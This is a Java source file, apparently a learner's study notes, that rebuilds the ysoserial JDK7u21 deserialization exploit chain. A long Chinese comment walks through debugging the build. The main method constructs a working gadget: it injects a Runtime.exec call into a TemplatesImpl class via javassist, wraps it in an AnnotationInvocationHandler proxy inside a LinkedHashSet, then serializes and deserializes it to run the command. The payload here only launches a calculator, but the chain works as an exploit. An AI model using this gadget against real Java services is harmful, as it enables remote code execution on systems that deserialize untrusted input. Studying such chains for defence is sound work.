package com.example.ysoserial_demo;

import com.example.commono.utils;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class jdk7u21 {
    /*
    跟着scz学java  http://scz.617.cn/  web -> jdk7u21
    还是先生成一个poc, 再debug

    在复现 CommonCollection4时，遇到过了 Template类来触发的，当时是用的 PriorityQueue 和 Transformer类来实现的
    也是调用了`getOutputProperties函数`，
    https://zhuanlan.zhihu.com/p/145441205

    这里可以参考部分代码，直接copy过来

    首先还是声明一个`AbstractTranslet`类的子类，及一个单独的类
    ```java
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    ```

    再利用反射构造一个Template类, 这里其实可以通过读取class文件来生成， 暂时先延续CommonCollections4的做法
    ```java
        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        final Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(jdk7u21.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(jdk7u21.StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(jdk7u21.Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

        ((Templates) template).getOutputProperties();
    ```
    报错如下：
    ```java
    /home/uustay/tools/jdk1.7.0_21/bin/java -javaagent:/usr/share/idea/lib/idea_rt.jar=43491:/usr/share/idea/bin -Dfile.encoding=UTF-8 -classpath /home/uustay/tools/jdk1.7.0_21/jre/lib/charsets.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/deploy.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/dnsns.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/localedata.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/sunec.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/sunjce_provider.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/sunpkcs11.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/ext/zipfs.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/javaws.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/jce.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/jfr.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/jfxrt.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/jsse.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/management-agent.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/plugin.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/resources.jar:/home/uustay/tools/jdk1.7.0_21/jre/lib/rt.jar:/home/uustay/IdeaProjects/demo/target/classes:/home/uustay/.m2/repository/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:/home/uustay/.m2/repository/xalan/xalan/2.7.1/xalan-2.7.1.jar:/home/uustay/.m2/repository/xalan/serializer/2.7.1/serializer-2.7.1.jar:/home/uustay/.m2/repository/xml-apis/xml-apis/1.3.04/xml-apis-1.3.04.jar:/home/uustay/.m2/repository/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:/home/uustay/.m2/repository/javassist/javassist/3.12.1.GA/javassist-3.12.1.GA.jar:/home/uustay/.m2/repository/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:/home/uustay/.m2/repository/javax/annotation/javax.annotation-api/1.2-b02/javax.annotation-api-1.2-b02.jar com.example.ysoserial_demo.jdk7u21
    Exception in thread "main" java.lang.NullPointerException
        at org.apache.xalan.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:366)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:341)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:369)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:390)
        at com.example.ysoserial_demo.jdk7u21.main(jdk7u21.java:109)

    ```

    看报错又存在一个`AnnotationInvocationHandler`, 在其`equalsImpl`函数中， 利用 invoke函数 调用了`getOutputProperties`，
    导致了命令执行， 所以还需要声明一个`AnnotationInvocationHandler`类； 该类的构造函数如下， 且非公开的函数，所以需要用反射来构造
    ```java

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
    ```
    而且如下图，看到 AnnotationInvocationHandler的 memerValues， 即我们所设置的map对象，其 key="f5a5a608", value="templateImpl"对象
    依此构造：
    ```java
        Map map = new HashMap();
        map.put("f5a5a608", template);
        String class_name = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class handler_class = Class.forName(class_name);
        Constructor constructor = handler_class.getDeclaredConstructor(new Class[]{Class.class, Map.class});
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

    ```

     AnnotationInvocationHandler的type类型为 template，所以也通过反射配置上
     ```java
        Field field = invocationHandler.getClass().getDeclaredField("type");
        field.setAccessible(true);
        field.set(invocationHandler, template);
     ```

    看到DEBUG信息中，有一个`$Porxy0`, 通过前边的分析，我们知道这是一个动态代理类，
    同样的，看ysoserial的poc,也声明了一个代理类
    ```java
        Templates proxy = (Templates) Proxy.newProxyInstance(
                Templates.class.getClassLoader(),
                new  Class[] { Templates.class },
                invocationHandler
        );

        //proxy.getOutputProperties(); 也成功执行到了 该函数，但是报错，先不管
    ```

    有一个LinkedHashSet, 其值为 `TemplatesImple`对象
    ```java
        HashSet hashSet = new LinkedHashSet();
        hashSet.add(proxy);

        byte[] b = utils.do_serialize(hashSet);
        Object a = utils.do_unserialize(b);

    ```
    但是并没有报错， 对比一下，发现hashSet对象要push两个参数
    ```java
    hashSet.add(template);
    hashSet.add(proxy);
    ```
    在hashset添加template对象后， 在序列化的时候触发了，其报错为：
    ```java
    Exception in thread "main" java.io.NotSerializableException: org.apache.xalan.xsltc.runtime.Hashtable
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1180)
        at java.io.ObjectOutputStream.defaultWriteFields(ObjectOutputStream.java:1528)
        at java.io.ObjectOutputStream.defaultWriteObject(ObjectOutputStream.java:438)
        at org.apache.xalan.xsltc.trax.TemplatesImpl.writeObject(TemplatesImpl.java:198)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:975)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1480)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1416)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1174)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:346)
        at java.util.HashSet.writeObject(HashSet.java:284)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:601)
        at java.io.ObjectStreamClass.invokeWriteObject(ObjectStreamClass.java:975)
        at java.io.ObjectOutputStream.writeSerialData(ObjectOutputStream.java:1480)
        at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1416)
        at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1174)
        at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:346)
        at com.example.commono.utils.do_serialize(utils.java:11)
        at com.example.ysoserial_demo.jdk7u21.main(jdk7u21.java:238)

    Process finished with exit code 1


    ```

    在debug的时候，触发如下：

    即在hashset.add()时，就会触发， 这显然不是想要的结果，看一下ysoserial的poc,  是先put了一个普通对象，最后才是template类
    这次成功触发， 设置一个


    之所以没报错，是因为在`AnnotationInvocationHandler`的 `equalsImple`函数中 catch到了错误，InvocationTargetException
    return False, 将错误吞了
    ```java

     try {
        var8 = var5.invoke(var1);
    } catch (InvocationTargetException var11) {
        return false;
    } catch (IllegalAccessException var12) {
        throw new AssertionError(var12);
    }
    ```

    至于原poc中
    ```java

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

    ```
    没有用到，在scz的文章中也提到了
    ```java

     //下面这两个操作对7u21没必要
    // Field           _auxClasses = TemplatesImpl.class.getDeclaredField( "_auxClasses" );
    // _auxClasses.setAccessible( true );
    // _auxClasses.set( ti, null );
    // Field           _class      = TemplatesImpl.class.getDeclaredField( "_class" );
    // _class.setAccessible( true );
    // _class.set( ti, null );
    ```
    至此 7u21分析完毕

     */

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
//        File f = new File("/home/uustay/test_7u21.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();

        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        final Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(jdk7u21.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(jdk7u21.StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator1111\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(jdk7u21.Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

//        ((Templates) template).getOutputProperties();

        Map map = new HashMap();
        map.put("f5a5a608", 1);
        String class_name = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class handler_class = Class.forName(class_name);
        Constructor constructor = handler_class.getDeclaredConstructor(new Class[]{Class.class, Map.class});
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map);

        Field field = invocationHandler.getClass().getDeclaredField("type");
        field.setAccessible(true);
        field.set(invocationHandler, Templates.class);

        Templates proxy = (Templates) Proxy.newProxyInstance(
                Templates.class.getClassLoader(),
                new  Class[] { Templates.class },
                invocationHandler
        );

//        proxy.getOutputProperties();
        HashSet hashSet = new LinkedHashSet();
        hashSet.add(template);
        hashSet.add(proxy);

        map.put("f5a5a608", template);

        byte[] b = utils.do_serialize(hashSet);
        Object a = utils.do_unserialize(b);






    }
}
